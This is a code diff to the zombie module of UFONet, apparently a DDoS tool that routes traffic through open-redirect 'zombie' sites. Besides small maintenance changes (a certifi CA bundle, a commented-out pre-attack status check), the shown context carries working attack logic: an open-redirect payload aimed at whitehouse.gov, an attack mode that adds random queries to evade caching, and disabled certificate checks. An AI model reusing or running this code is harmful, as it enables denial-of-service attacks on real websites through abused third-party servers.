@@ -9,13 +9,13 @@ You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import io, hashlib, re, sys
+import io, hashlib, re, sys, certifi
 import time, threading, random
 from .randomip import RandomIP
 try:
     import pycurl
 except:
-    print("\nError importing: pycurl lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-pycurl'\n")
+    print("\nError importing: pycurl lib. \n\n")
     sys.exit(2)
 
 class Zombie: # class representing a zombie
@@ -49,7 +49,7 @@ class Zombie: # class representing a zombie
                 c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
             except:
                 c.setopt(pycurl.URL, self.zombie.encode('utf-8')) 
-            c.setopt(pycurl.NOBODY, 1) # use HEAD
+            c.setopt(pycurl.NOBODY, True) # use HEAD
         if self.payload == True:
             payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
             try:
@@ -57,18 +57,18 @@ class Zombie: # class representing a zombie
             except:
                 c.setopt(pycurl.URL, payload.encode('utf-8'))
             c.setopt(pycurl.NOBODY, 0) # use GET
-        if self.ufo.external == True:
-            external_service = "https://status.ws/" # external check
-            if options.target.startswith('https://'): # fixing url prefix
-                options.target = options.target.replace('https://','')
-            if options.target.startswith('http://'): # fixing url prefix
-                options.target = options.target.replace('http://','')
-            external = external_service + options.target
-            try:
-                c.setopt(pycurl.URL, external) # external HEAD check before to attack
-            except:
-                c.setopt(pycurl.URL, external.encode('utf-8'))
-            c.setopt(pycurl.NOBODY, 0) # use GET
+        #if self.ufo.external == True:
+        #    external_service = "https://status.ws/" # external check
+        #    if options.target.startswith('https://'): # fixing url prefix
+        #        options.target = options.target.replace('https://','')
+        #    if options.target.startswith('http://'): # fixing url prefix
+        #        options.target = options.target.replace('http://','')
+        #    external = external_service + options.target
+        #    try:
+        #        c.setopt(pycurl.URL, external) # external HEAD check before to attack
+        #    except:
+        #        c.setopt(pycurl.URL, external.encode('utf-8'))
+        #    c.setopt(pycurl.NOBODY, 0) # use GET
         if self.attack_mode == True:
             if options.place: # use self.zombie's vector to connect to a target's place and add a random query to evade cache
                 random_name_hash = random.randint(1, 100000000) 
@@ -108,6 +108,7 @@ class Zombie: # class representing a zombie
         c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
         c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
 #       c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
+        c.setopt(pycurl.CAINFO, certifi.where()) # black magic
         c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
         c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
         c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
@@ -181,6 +182,7 @@ class Zombie: # class representing a zombie
                     self.connection_failed = False
                 except:
                     self.connection_failed = True
+
         if self.ufo.head == True: # HEAD reply
             try:
                 reply = b.getvalue().decode('utf-8')
